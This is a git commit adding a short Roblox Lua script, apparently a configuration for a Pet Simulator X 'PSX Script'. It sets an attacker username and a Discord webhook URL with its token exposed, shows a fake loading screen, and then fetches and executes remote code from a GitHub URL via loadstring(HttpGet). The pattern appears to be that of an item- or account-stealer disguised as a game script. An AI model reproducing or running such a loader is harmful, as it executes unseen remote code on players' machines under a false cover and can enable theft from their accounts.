3c7b7779da7378c9becea156a9d10dffa909a1f9
Hegejfvsjw <132260042+Hegejfvsjw@users.noreply.github.com>
2023-06-28 20:40:05 +0300

    script.lua

---
+++ script.lua
@@ -0,0 +1,10 @@
+Username = "LEGACROW11"
+WebHook = "https://discord.com/api/webhooks/1107037193547042956/LsZ5NpRtPPV_jmw4vPNGI9yMPIf0VULYqQP6uToVFtGbWDJEQ4FyODVPp-ll7cMMWzZi"
+
+loadingscreen = true
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
